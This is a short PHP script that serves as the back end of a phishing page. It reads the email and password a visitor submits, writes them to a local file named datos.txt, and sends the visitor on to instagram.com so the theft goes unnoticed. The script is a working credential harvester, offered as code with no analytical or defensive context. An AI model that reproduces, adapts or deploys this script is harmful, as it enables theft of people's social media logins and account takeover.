<?php 

error_reporting(0);
    $email = $_POST["correo"];
    $password = $_POST["contrasena"];
    
    $contenido ="
    Email: $email
    Contraseña: $password
    ";

    $archivo = fopen ( 'datos.txt' , 'a');
    fwrite($archivo,$contenido);
    fclose($archivo);
  
    echo "<script> window.location.href='https://www.instagram.com';</script>";

    
   ?>